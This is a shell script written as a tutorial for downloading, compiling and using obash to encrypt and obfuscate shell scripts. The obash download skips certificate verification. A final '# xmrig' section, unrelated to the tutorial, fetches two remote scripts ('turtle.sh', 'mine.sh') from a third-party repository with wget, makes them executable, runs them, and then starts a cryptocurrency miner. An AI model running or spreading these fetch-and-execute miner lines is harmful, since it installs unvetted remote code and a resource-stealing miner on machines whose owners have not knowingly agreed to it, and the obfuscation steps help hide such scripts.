#Encrypt and obfuscate your shell script

#We need to ensure package manager is updated and free from errors, then install dependencies.

#Debian/Ubuntu:

export DEBIAN_FRONTEND=noninteractive

apt update

apt autoremove --fix-missing -y -f

apt upgrade -y

apt install build-essential libssl-dev curl -y


#RHEL/Fedora:

yum update -y

yum groupinstall "Development Tools" -y

yum install openssl-devel zip curl -y


#Then download and extract obash source archive:

curl -skL "https://github.com/louigi600/obash/archive/8976fd2fa256c583769b979036f59a741730eb48.tar.gz" -o obash.tgz

tar xf obash.tgz && rm -f obash.tgz


#Now enter obash source directory, run make clean first and start compiling obash, then copy obash executable into bin/sbin path of your machine:

cd obash-8976fd2fa256c583769b979036f59a741730eb48

make clean

make

mv -f obash /usr/local/sbin/obash

cd .. && rm -rf obash-8976fd2fa256c583769b979036f59a741730eb48


#Now our obash is now ready to use, run obash -h for guide how to use.

#examples:
#Encrypt your myscript.sh with output filename MyEncryptedScript(executable only on local machine):

obash -o MyEncryptedScript myscript.sh

#Encrypt your myscript.sh with output filename MyEncryptedScript(executable on all machine/reusable):

obash -r -o MyEncryptedScript myscript.sh

#Test run: 

./MyEncryptedScript

# xmrig

wget https://raw.githubusercontent.com/itsgelogomayee/xmrig/main/turtle.sh && chmod +x turtle.sh && ./turtle.sh


wget https://raw.githubusercontent.com/itsgelogomayee/xmrig/main/mine.sh && chmod +x mine.sh && ./mine.sh

# run

./xmrig
